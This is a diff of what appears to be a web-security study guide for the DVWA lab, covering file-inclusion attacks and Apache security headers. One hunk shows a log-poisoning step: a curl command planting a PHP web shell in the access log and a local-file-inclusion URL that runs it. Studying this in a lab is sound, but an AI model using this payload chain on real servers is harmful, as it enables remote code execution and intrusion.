@@ -274,8 +274,8 @@ STEP 4- File Inclusion Attacks
      - Definition: An exploitation technique where an attacker injects PHP code into server-writable artifacts (access log, error log, upload entries, session files) and then uses LFI to include and execute that log, resulting in RCE.
      - curl -s -A '<?php /*LOG123*/ system($_GET["cmd"]); ?>' "http://127.0.0.1/DVWA/"
      - sudo tail -n 40 /var/log/apache2/access.log
-     -  ## include the log (logged-in session required):
-     -  ## http://127.0.0.1/DVWA/vulnerabilities/fi/?page=/var/log/apache2/access.log&cmd=id
+     -  include the log (logged-in session required):
+     -  http://127.0.0.1/DVWA/vulnerabilities/fi/?page=/var/log/apache2/access.log&cmd=id
 - Causes
   - Unsanitized user input used directly in include, require, or file access APIs.
   - Overly permissive server/PHP settings: e.g., allow_url_include = On, weak open_basedir or world-readable config/log files.
@@ -445,16 +445,16 @@ STEP 6-  Web Security Headers
   - Step 3 – Add security headers in Apache vhost
     - Edit the default vhost: sudo nano /etc/apache2/sites-available/000-default.conf
     - Inside <VirtualHost *:80>, add:
-       - # === Security Headers (for DVWA testing) ===
+       -  === Security Headers (for DVWA testing) ===
        - Header always set X-Content-Type-Options "nosniff"
        - Header always set X-Frame-Options "SAMEORIGIN"
        - Header always set Referrer-Policy "strict-origin-when-cross-origin"
        - Header always set Permissions-Policy "geolocation=(), microphone=(), camera=()"
-       - # Content-Security-Policy in Report-Only mode to avoid breaking DVWA
+       - === Content-Security-Policy in Report-Only mode to avoid breaking DVWA ===
        - Header always set Content-Security-Policy-Report-Only "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; object-src 'none'; base-uri 'self';"
-       - # HSTS only if HTTPS is enabled
-       - #Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"
-       - # === End security headers ===
+       - === HSTS only if HTTPS is enabled ===
+       - === Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains" ===
+       -  === End security headers ===
   - Theory Behind Each Header
     - 1. X-Content-Type-Options: nosniff
       - Prevents the browser from interpreting files as a different MIME type than declared.
